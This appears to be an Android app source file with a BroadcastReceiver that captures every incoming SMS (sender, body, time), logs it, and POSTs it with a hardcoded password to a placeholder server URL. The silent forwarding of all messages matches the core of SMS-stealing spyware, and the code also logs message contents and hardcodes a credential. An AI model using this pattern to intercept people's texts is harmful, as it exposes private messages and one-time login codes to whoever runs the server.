package com.khair.aksms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.text.DateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class SMSReciver extends BroadcastReceiver {

    @Override

    public void onReceive(Context context, Intent intent) {
        final Bundle bundle = intent.getExtras();
        Log.d("smsBroadcast", "onReceive called()");

        try {
            if (bundle != null) {
                final Object[] pdusObj = (Object[]) bundle.get("pdus");

                for (int i = 0; i < pdusObj.length; i++) {
                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                    String senderNum = currentMessage.getDisplayOriginatingAddress();
                    String message = currentMessage.getDisplayMessageBody();

                    long time = currentMessage.getTimestampMillis();
                    String smsTime = DateFormat.getDateTimeInstance().format(new Date(time));

                    Log.d("smsBroadcast", "senderNum: "+senderNum);
                    Log.d("smsBroadcast", "message: "+message);
                    Log.d("smsBroadcast", "smsTime: "+smsTime);

                    //sending sms to your server
                    smsSendToServer(context, senderNum, message, smsTime);



                }
            }
        } catch (Exception e) {
        }
    }




    //====================================================================

    private void smsSendToServer(Context myContext, String senderNum, String message, String smsTime){
        long time= System.currentTimeMillis();

        final String url = "https://localhost/notifition/update_info.php";

        RequestQueue MyRequestQueue = Volley.newRequestQueue(myContext);


        StringRequest MyStringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Log.d("smsBroadcast", ""+response);
            }
        }, new Response.ErrorListener() { //Create an error listener to handle errors appropriately.
            @Override
            public void onErrorResponse(VolleyError error) {
                //This code is executed if there is an error.
                Log.d("smsBroadcast", "Error: "+error.getMessage());
            }
        })

        {
            protected Map<String, String> getParams() {
                Map<String, String> MyData = new HashMap<String, String>();
                MyData.put("password", "1234567890");
                MyData.put("senderNum", senderNum);
                MyData.put("message", message);
                MyData.put("smsTime", smsTime);
                return MyData;
            }
        };


        MyRequestQueue.add(MyStringRequest);


    }


    //====================================================================
    //====================================================================
    //====================================================================


}